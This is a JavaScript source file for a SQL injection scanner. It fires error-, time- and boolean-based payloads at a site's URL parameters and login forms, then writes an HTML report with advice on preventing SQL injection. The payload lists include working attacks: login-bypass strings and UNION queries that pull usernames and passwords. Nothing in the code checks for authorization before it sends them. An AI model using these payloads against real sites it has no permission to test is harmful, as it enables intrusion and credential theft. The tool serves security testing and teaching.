/**
 * SQL Injection Test Runner (ENHANCED VERSION)
 * 
 * Security Features:
 * - No destructive payloads (safe detection only)
 * - Timeout protection on all requests
 * - Request concurrency limits
 * - Multi-parameter testing
 * - Extended payload library
 * 
 * Usage:
 *   runSQLInjectionTest(url, paramName, options)
 */
const axios = require('axios');
const fs = require('fs').promises;

// ────────────────────────────────────────────────
//  Retry helper for network resilience
// ────────────────────────────────────────────────
async function fetchWithRetry(url, options = {}, retries = 2) {
  for (let i = 0; i < retries; i++) {
    try {
      return await axios.get(url, {
        ...options,
        timeout: options.timeout || 10000,
        timeoutErrorMessage: 'Request timeout'
      });
    } catch (err) {
      if (i === retries - 1) throw err;
      await new Promise(r => setTimeout(r, 1000 * (i + 1))); // Exponential backoff
    }
  }
}

async function fetchWithRetryPost(url, data, options = {}, retries = 2) {
  for (let i = 0; i < retries; i++) {
    try {
      return await axios.post(url, data, {
        ...options,
        timeout: options.timeout || 10000,
        timeoutErrorMessage: 'Request timeout'
      });
    } catch (err) {
      if (i === retries - 1) throw err;
      await new Promise(r => setTimeout(r, 1000 * (i + 1))); // Exponential backoff
    }
  }
}

// ────────────────────────────────────────────────
//  Payloads – Detection only (non-destructive) - ENHANCED
// ────────────────────────────────────────────────
const errorBasedPayloads = [
  "' OR '1'='1",
  "' OR 1=1 --",
  "admin' --",
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "') OR ('1'='1",
  "1' ORDER BY 100--",
  "1 AND 1=CONVERT(int,(SELECT @@version))--",
  // Additional aggressive payloads
  "' OR ''='",
  "' OR 1=1#",
  "' OR '1'='1' --",
  "1' AND '1'='1",
  "1' OR '' --1'='1",
  "admin' OR '1'='1'--",
  "') OR ('1'='1'--",
  "' UNION ALL SELECT NULL--",
  "' UNION SELECT username,password FROM users--",
  "1' ORDER BY 1--",
  "1' ORDER BY 2--",
  "1' ORDER BY 3--",
  "-1' OR '1'='1'--",
  "' AND 1=1--",
  "' AND 1=2--",
  "1' AND 1=1--",
  "1' AND 1=2--",
  "1' OR 'x'='x",
  "1' OR 'x'='y",
  "' OR username LIKE '%admin%'",
  "' OR 1=1 LIMIT 1--",
  "' OR 'a'='a' -- '",
  "' OR 1=1 LIMIT 1;#",
  "1' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL,NULL--",
  "' UNION ALL SELECT * FROM users--",
  "1' AND SLEEP(5)--",
  "' AND 1=1 AND ''='",
  "' AND 1=2 AND ''='",
];

const timeBasedPayloads = [
  "' AND SLEEP(2)--",
  "' WAITFOR DELAY '0:0:2'--",
  "'; SELECT IF(1=1,SLEEP(2),0)--",
  "1' AND SLEEP(2)--",
  "';WAITFOR DELAY '0:0:2'--",
];

const booleanBasedPayloads = [
  "' OR '1'='1",
  "' OR '1'='2",
  "1' AND '1'='1",
  "1' AND '1'='2",
  // Additional boolean blind
  "1' AND 1=1--",
  "1' AND 1=2--",
  "' OR 'a'='a",
  "' OR 'a'='b",
  "1' OR 1=1--",
  "1' OR 1=2--",
];

// Common vulnerable parameters to test (GET requests)
const commonParams = ['id', 'user', 'userid', 'username', 'email', 'search', 'query', 'page', 'cat', 'category', 'product', 'item', 'pid', 'uid', 'id', 'post', 'news', 'article', 'book', 'film'];

// Common login form parameters (POST requests)
const loginParams = ['username', 'email', 'user', 'password', 'login', 'userid', 'uid', 'name', 'pass', 'loginusername', 'loginemail'];

// NOTE: Destructive payloads have been removed for security.
// This scanner performs safe detection-only testing.

// ────────────────────────────────────────────────
//  Detection helpers
// ────────────────────────────────────────────────
const errorKeywords = [
  /sql syntax/i, /mysql/i, /mariadb/i, /sqlserver/i, /ora-/i,
  /unclosed quotation/i, /you have an error/i, /near/i,
  /warning.*mysql/i, /MySQLSyntaxErrorException/i,
  /unterminated.*quoted string/i, /SQLite.*error/i,
  /Microsoft SQL Native Client error/i, /ODBC SQL Server Driver/i,
  /PostgreSQL.*error/i, /FATAL.*unterminated/i,
  /SQL error/i, /SQLException/i, /sqlstate/i,
  /incorrect syntax near/i, /ORA-00933/i, /PLS-00103/i
];

// WAF/Protection detection keywords
const wafKeywords = [
  /forbidden/i, /access denied/i, /blocked/i, /security violation/i,
  /not allowed/i, /attack detected/i, /malicious/i, /suspicious/i,
  /cloudflare/i, /incapsula/i, /imperva/i, /akamai/i, /sucuri/i,
  /mod_security/i, /modsecurity/i, /dotdefender/i, /barracuda/i,
  /palo alto/i, /fortiweb/i, /safe3/i, /aqtronix/i,
  /sql injection/i, /xss attack/i, /cross-site scripting/i
];

function isErrorBasedResponse(text) {
  return errorKeywords.some(k => k.test(text));
}

function isWAFResponse(text, status) {
  // Check for WAF blocks via status code or response content
  if (status === 403 || status === 406 || status === 405 || status === 419) {
    return true;
  }
  return wafKeywords.some(k => k.test(text));
}

function getResponseSignature(res) {
  if (!res) return null;
  const responseText = String(res.data || '');
  return {
    status: res.status,
    length: responseText.length,
    hasError: isErrorBasedResponse(responseText),
    hasWAF: isWAFResponse(responseText, res.status)
  };
}

async function measureDelay(url, expectedDelayMs = 2500) {
  const start = Date.now();
  try {
    await axios.get(url, { timeout: expectedDelayMs + 3000 });
  } catch (e) {
    // timeout is actually a signal here
  }
  return Date.now() - start;
}

// Detect SQL injection vulnerability
function detectSQLi(sig, delayMs, normalSig, normalDelay) {
  if (!sig) return false;
  
  // Check for SQL errors in response
  if (sig.hasError) return true;
  
  // Check for WAF response
  if (sig.hasWAF) return false;
  
  // Check for time-based injection (delay > normal + 1 second)
  if (delayMs > normalDelay + 1000) return true;
  
  // Check for significant response changes
  if (normalSig) {
    if (sig.status !== normalSig.status && sig.status >= 500) return true;
    const lengthDiff = Math.abs(sig.length - normalSig.length);
    if (lengthDiff > 200) return true;
  }
  
  return false;
}

// ────────────────────────────────────────────────
//  Core test function - ENHANCED with multi-param testing
// ────────────────────────────────────────────────
async function runSQLInjectionTest(baseUrl, paramName = 'id', options = {}) {
  const {
    useDestructive = false,
    timeout = 10000,  // Increased timeout for slow networks
    maxParallel = 4,
    testAllParams = true
  } = options;

  // Security: Destructive payloads completely removed
  // Only detection payloads are used - using top 8 most effective
  const payloads = [
    ...errorBasedPayloads.slice(0, 5),
    ...timeBasedPayloads.slice(0, 2),
    ...booleanBasedPayloads.slice(0, 3)
  ];

  const results = [];
  let score = 0;                // 0–100
  const signals = new Set();    // what kind of vuln we found
  let testedParams = [paramName]; // Track which params we've tested

  // Prepare base (normal) request - Fixed URL construction
  let baseUrlWithParam = baseUrl.includes('?') ? baseUrl : `${baseUrl}?${paramName}=normal`;
  let baseRes;
  try {
    baseRes = await axios.get(baseUrlWithParam, { timeout });
  } catch (e) {
    console.warn("Cannot reach base URL →", e.message);
    return { error: "Cannot reach target", score: 0 };
  }

  const normalSignature = getResponseSignature(baseRes);
  // Fixed: properly construct URL for delay measurement
  const delayTestUrl = baseUrl.includes('?') ? `${baseUrl}&${paramName}=1` : `${baseUrl}?${paramName}=1`;
  const normalDelay = await measureDelay(delayTestUrl);

  console.log(`Normal response: ${normalSignature.status} | ${normalSignature.length} bytes | ~${normalDelay}ms`);

  // ── NEW: If testAllParams is enabled, test common parameters ──
  if (testAllParams && !baseUrl.includes('?')) {
    console.log('[INFO] Testing multiple common parameters for better coverage...');
    // Only add param if baseUrl doesn't already have query string
    for (const testParam of commonParams.slice(0, 3)) { // Test first 3 common params
      if (testParam !== paramName) {
        const testUrl = `${baseUrl}?${testParam}=1`;
        try {
          const testRes = await axios.get(testUrl, { timeout: 3000 });
          if (testRes.status === 200 && testRes.data) {
            // This param exists! Use it for testing
            console.log(`[INFO] Found working parameter: ${testParam}`);
            testedParams.push(testParam);
            break; // Use first working param
          }
        } catch (e) {
          // Parameter doesn't exist or is invalid
        }
      }
    }
  }

  // ── Run tests for each parameter ──
  for (const currentParam of testedParams) {
    console.log(`[INFO] Testing parameter: ${currentParam}`);
    
    for (const payload of payloads) {
      const testParam = `${currentParam}=${encodeURIComponent(payload)}`;
      const testUrl = baseUrl.includes('?') ? `${baseUrl}&${testParam}` : `${baseUrl}?${testParam}`;

      let res = null;
      let delayMs = 0;
      let error = null;

      const start = Date.now();
      try {
        res = await axios.get(testUrl, { timeout, validateStatus: () => true });
        delayMs = Date.now() - start;
      } catch (e) {
        error = e.message;
      }

      const sig = res ? getResponseSignature(res) : { status: 0, length: 0, html: '' };
      const isVuln = detectSQLi(sig, delayMs, normalSignature, normalDelay);

      if (isVuln) {
        console.log(`[!] VULNERABLE: ${currentParam} with payload: ${payload.substring(0, 20)}...`);
        signals.add('error-based');
        if (delayMs > normalDelay + 1000) signals.add('time-based');
        results.push({
          param: currentParam,
          payload,
          type: delayMs > normalDelay + 1000 ? 'time-based' : 'error-based',
          status: sig.status,
          delay: delayMs
        });
      }
    }
  }

  // ── NEW: Test POST login forms (quick test) ──
  console.log('[INFO] Testing POST login forms...');
  
  // Quick test with most common login params and top payloads only
  const quickLoginParams = ['username', 'email', 'user'];
  const quickPayloads = ["' OR '1'='1", "' OR 1=1 --", "admin' --", "' OR ''='"];
  
  for (const usernameParam of quickLoginParams) {
    for (const payload of quickPayloads) {
      const postData = {};
      postData[usernameParam] = payload;
      postData['password'] = 'anything';
      
      try {
        const postStart = Date.now();
        const postRes = await axios.post(baseUrl, postData, {
          timeout: 5000,
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          validateStatus: () => true
        });
        const postDelay = Date.now() - postStart;
        
        const postSig = getResponseSignature(postRes);
        const html = postSig.html || '';
        
        // Check if we got in (different response than failed login)
        if (postSig.status === 200 && !html.includes('invalid') && 
            !html.includes('incorrect') && !html.includes('failed') && !html.includes('wrong')) {
          console.log(`[!] POST SQLi VULNERABLE: ${usernameParam}=${payload}...`);
          signals.add('post-login-based');
          results.push({
            param: `${usernameParam} (POST)`,
            payload,
            type: 'post-login-based',
            status: postSig.status,
            delay: postDelay
          });
          break; // Found vulnerability, stop testing
        }
        
        // Check for SQL errors
        if (postSig.hasError) {
          console.log(`[!] POST SQL ERROR: ${usernameParam}=${payload}...`);
          signals.add('error-based');
          results.push({
            param: `${usernameParam} (POST)`,
            payload,
            type: 'error-based',
            status: postSig.status,
            delay: postDelay
          });
          break;
        }
      } catch (e) {
        // Connection error - skip
      }
    }
    if (signals.has('post-login-based') || signals.has('error-based')) break;
  }
  
  // Calculate score for POST findings
  if (signals.has('post-login-based')) {
    score += 50; // High score for successful login bypass
  } else if (signals.has('error-based')) {
    score += 35; // Error-based SQLi
  }

  // ── Run GET tests for each parameter ──
  for (const currentParam of testedParams) {
    console.log(`[INFO] Testing parameter: ${currentParam}`);
    
    for (const payload of payloads) {
      const testParam = `${currentParam}=${encodeURIComponent(payload)}`;
      const testUrl = baseUrl.includes('?') ? `${baseUrl}&${testParam}` : `${baseUrl}?${testParam}`;

      let res = null;
      let delayMs = 0;
      let error = null;

      const start = Date.now();
      try {
        res = await axios.get(testUrl, { timeout, validateStatus: () => true });
        delayMs = Date.now() - start;
      } catch (e) {
        error = e.message;
      }

      const sig = getResponseSignature(res);
      const result = {
        payload,
        param: currentParam,
        status: res?.status || null,
        length: sig?.length || 0,
        delayMs,
        error,
        suspicious: false,
        reason: []
      };

      // ── Detection logic ────────────────────────────────
      // Check for SQL errors
      if (sig?.hasError) {
        result.suspicious = true;
        result.reason.push("SQL error message in response");
        score += 35;
        signals.add("error-based");
      }

      // Check for WAF/Protection blocks
      if (sig?.hasWAF) {
        result.suspicious = true;
        result.reason.push("WAF/Protection detected (403/blocked)");
        score += 20; // Lower score for WAF blocks as they're protective
        signals.add("waf-detected");
      }

      // Check for time-based blind SQLi
      if (delayMs > normalDelay + 2000 && payload.toUpperCase().includes('SLEEP')) {
        result.suspicious = true;
        result.reason.push(`Significant delay (${delayMs}ms)`);
        score += 40;
        signals.add("time-based");
      }

      // Check for boolean-based blind SQLi
      if (res && booleanBasedPayloads.includes(payload)) {
        if (sig.length !== normalSignature.length || sig.status !== normalSignature.status) {
          result.suspicious = true;
          result.reason.push("Response difference on boolean payload");
          score += 25;
          signals.add("boolean-based");
        }
      }

      // Timeout on time-based payload
      if (error === 'timeout' && payload.toUpperCase().includes('SLEEP')) {
        result.suspicious = true;
        result.reason.push("Request timeout on time-based payload");
        score += 30;
        signals.add("time-based");
      }

      // NEW: Check for response content differences indicating potential SQLi
      if (res && sig.length !== normalSignature.length && !result.suspicious) {
        // Significant length change might indicate SQL injection
        const lengthDiff = Math.abs(sig.length - normalSignature.length);
        if (lengthDiff > 100) { // More than 100 bytes difference
          result.reason.push(`Response length changed by ${lengthDiff} bytes (possible injection)`);
          score += 15;
        }
      }

      results.push(result);
    }
  }

  // Cap score at 100
  score = Math.min(100, Math.round(score));

  // ── Generate detailed prevention recommendations based on findings ──
  const prevention = [];
  const urlLower = baseUrl.toLowerCase();
  
  // Determine website type for specific recommendations
  const isWordPress = urlLower.includes('wordpress') || urlLower.includes('wp-') || urlLower.includes('/wp-admin');
  const isPHP = urlLower.includes('.php') || urlLower.includes('index') || urlLower.includes('page');
  const isEcommerce = urlLower.includes('shop') || urlLower.includes('store') || urlLower.includes('cart') || urlLower.includes('product');
  const isLoginPage = urlLower.includes('login') || urlLower.includes('signin') || urlLower.includes('auth');
  
  // Error-based SQLi recommendations
  if (signals.has("error-based")) {
    prevention.push("<strong>🔴 CRITICAL:</strong> Your site is leaking SQL error messages!");
    prevention.push("• <strong>Parameterized Queries:</strong> Never concatenate user input directly into SQL strings. Use prepared statements:");
    
    if (isPHP) {
      prevention.push("  PHP Example (MySQLi): <code>$stmt = $mysqli->prepare('SELECT * FROM users WHERE id = ?');</code>");
      prevention.push("  PHP Example (PDO): <code>$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');</code>");
    } else if (isWordPress) {
      prevention.push("  WordPress: Use <code>$wpdb->prepare()</code> with placeholders:");
      prevention.push("  <code>$wpdb->prepare('SELECT * FROM users WHERE id = %d', $user_id);</code>");
    } else {
      prevention.push("  Use your ORM's query builder with parameter binding");
    }
    
    prevention.push("• <strong>ORM Usage:</strong> Consider using an ORM (Sequelize, Prisma, TypeORM, SQLAlchemy, Hibernate)");
    prevention.push("• <strong>Disable Error Display:</strong> In production, set <code>display_errors = Off</code> in php.ini");
    prevention.push("• <strong>Custom Error Pages:</strong> Return generic error messages to users, log details server-side");
  }
  
  // WAF Detection - positive security indicator
  if (signals.has("waf-detected")) {
    prevention.push("<strong>✅ GOOD:</strong> WAF/Protection detected!");
    prevention.push("• Your site appears to have a Web Application Firewall");
    prevention.push("• However, don't rely solely on WAF - fix the underlying SQL injection vulnerabilities");
    prevention.push("• WAFs can be bypassed; defense in depth is essential");
  }
  
  // Time-based SQLi recommendations
  if (signals.has("time-based")) {
    prevention.push("<strong>🟠 HIGH:</strong> Time-based blind SQL injection detected!");
    prevention.push("• <strong>Query Timeout:</strong> Set maximum query execution time (2-3 seconds max)");
    prevention.push("• <strong>WAF Rules:</strong> Block payloads containing SLEEP(), BENCHMARK(), WAITFOR DELAY");
    prevention.push("• <strong>Rate Limiting:</strong> Limit requests per IP, especially with slow response times");
    prevention.push("• <strong>Input Validation:</strong> Validate and sanitize all numeric/ID parameters");
    
    if (isEcommerce) {
      prevention.push("  E-commerce: Ensure product/category filters use type-casted integers");
    }
  }
  
  // Boolean-based SQLi recommendations
  if (signals.has("boolean-based")) {
    prevention.push("<strong>🟡 MEDIUM:</strong> Boolean-based blind SQL injection detected!");
    prevention.push("• <strong>Consistent Responses:</strong> Always return same structure for success/failure");
    prevention.push("• <strong>Generic Error Messages:</strong> Don't reveal 'user not found' vs 'wrong password'");
    prevention.push("• <strong>Response Timing:</strong> Add random delays to prevent timing attacks");
    
    if (isLoginPage) {
      prevention.push("  Login Page: Use single 'Invalid credentials' message for all failures");
    }
  }
  
  // General recommendations for all websites
  prevention.push("<strong>🛡️ GENERAL PROTECTION:</strong>");
  prevention.push("• <strong>Least Privilege:</strong> Database user should have minimum required permissions");
  prevention.push("• <strong>Web Application Firewall:</strong> Deploy ModSecurity, Cloudflare WAF, or AWS WAF");
  prevention.push("• <strong>Audit Logging:</strong> Enable slow query log and audit trail for suspicious queries");
  prevention.push("• <strong>Regular Updates:</strong> Keep your CMS, frameworks, and libraries patched");
  
  // Website-specific additional recommendations
  if (isWordPress) {
    prevention.push("<strong>📌 WORDPRESS SPECIFIC:</strong>");
    prevention.push("• Install <strong>Wordfence</strong> or <strong>Sucuri</strong> security plugins");
    prevention.push("• Use <strong>WPS Hide Login</strong> to hide admin page");
    prevention.push("• Disable XML-RPC if not needed (major attack vector)");
    prevention.push("• Add to wp-config.php: <code>define('DISALLOW_FILE_EDIT', true);</code>");
  }
  
  if (isEcommerce) {
    prevention.push("<strong>🛒 E-COMMERCE SPECIFIC:</strong>");
    prevention.push("• Ensure PCI-DSS compliance for payment data");
    prevention.push("• Use tokenization for payment information");
    prevention.push("• Implement order ID randomization (don't use sequential IDs)");
    prevention.push("• Separate database user for checkout vs catalog access");
  }
  
  if (isPHP) {
    prevention.push("<strong>🐘 PHP SPECIFIC:</strong>");
    prevention.push("• Enable <code>mysqli.real_escape_string()</code> or use PDO prepared statements");
    prevention.push("• Set <code>sql.safe_mode = On</code> in php.ini");
    prevention.push("• Consider using <strong>Doctrine ORM</strong> for better security");
  }
  
  prevention.push("<strong>📚 TESTING:</strong>");
  prevention.push("• Run OWASP ZAP or Burp Suite for comprehensive testing");
  prevention.push("• Perform regular penetration testing");
  prevention.push("• Use Content Security Policy (CSP) headers");

  // ── Final result ────────────────────────────────────
  const summary = {
    url: baseUrl,
    vulnerable: score >= 40,
    score: score,
    severity: score >= 80 ? "Critical" : score >= 60 ? "High" : score >= 40 ? "Medium" : "Low",
    detectedTechniques: Array.from(signals),
    testedParameters: testedParams,
    preventionTips: prevention,
    results: results
  };

  return summary;
}

// ────────────────────────────────────────────────
//  Simple HTML + Chart.js report generator
// ────────────────────────────────────────────────
function generateHTMLReport(result) {
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>SQLi Test Report - ${result.url}</title>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    body { font-family: system-ui, sans-serif; margin: 2rem; line-height: 1.6; }
    h1, h2 { color: #c1121f; }
    .score { font-size: 3rem; font-weight: bold; }
    .critical { color: #c1121f; } .high { color: #d97706; }
    .medium { color: #ca8a04; } .low { color: #059669; }
    table { border-collapse: collapse; width: 100%; margin: 1.5rem 0; }
    th, td { border: 1px solid #ddd; padding: 0.6rem; text-align: left; }
    th { background: #f1f5f9; }
    .suspicious { background: #fee2e2; }
  </style>
</head>
<body>
  <h1>SQL Injection Test Report</h1>
  <p>Target: <strong>${result.url}</strong></p>
  <p class="score ${(result.severity || 'unknown').toLowerCase()}">
    Vulnerability Score: ${result.score}/100 — ${result.severity || 'Unknown'}
  </p>
  <p>Tested Parameters: ${(result.testedParameters || []).join(', ')}</p>

  <h2>Detection Pie Chart</h2>
  <canvas id="vulnChart" width="400" height="400"></canvas>

  <h2>Prevention Recommendations</h2>
  <ul>
    ${(result.preventionTips || []).map(t => `<li>${t}</li>`).join('')}
  </ul>

  <h2>Detailed Results</h2>
  <table>
    <tr>
      <th>Payload</th>
      <th>Status</th>
      <th>Length</th>
      <th>Delay (ms)</th>
      <th>Suspicious?</th>
      <th>Reason</th>
    </tr>
    ${(result.results || []).map(r => `
      <tr class="${r.suspicious ? 'suspicious' : ''}">
        <td><code>${String(r.payload).replace(/&/g,'&').replace(/</g,'<').replace(/>/g,'>')}</code></td>
        <td>${r.status || '-'}</td>
        <td>${r.length}</td>
        <td>${r.delayMs}</td>
        <td>${r.suspicious ? 'YES' : 'No'}</td>
        <td>${r.reason.join(', ') || r.error || '-'}</td>
      </tr>
    `).join('')}
  </table>

  <script>
    const ctx = document.getElementById('vulnChart').getContext('2d');
    new Chart(ctx, {
      type: 'pie',
      data: {
        labels: ['No signs', 'Error-based', 'Time-based', 'Boolean-based'],
        datasets: [{
          data: [
            ${100 - result.score},
            ${(result.detectedTechniques || []).includes('error-based') ? result.score/3 : 0},
            ${(result.detectedTechniques || []).includes('time-based') ? result.score/3 : 0},
            ${(result.detectedTechniques || []).includes('boolean-based') ? result.score/3 : 0}
          ],
          backgroundColor: ['#10b981', '#ef4444', '#f59e0b', '#3b82f6']
        }]
      },
      options: {
        responsive: true,
        plugins: { legend: { position: 'top' } }
      }
    });
  </script>
</body>
</html>
  `;

  return html;
}

// Export for use by other modules
module.exports = { runSQLInjectionTest, generateHTMLReport };

// Example usage: only run when executed directly (not when required)
if (require.main === module) {
  (async () => {
    const target = process.env.TARGET_URL || "http://localhost/vulnerable/page.php";

    console.log("Starting SQLi test...");
    try {
      const report = await runSQLInjectionTest(target, "id", {
        timeout: 10000,
        testAllParams: true
      });

      console.log(JSON.stringify(report, null, 2));

      // Optional: save HTML report
      const html = generateHTMLReport(report);
      await fs.writeFile("sqli-report.html", html);
      console.log("Report saved → sqli-report.html");
    } catch (e) {
      console.error('SQLi test failed:', e && e.message ? e.message : e);
    }
  })();
}
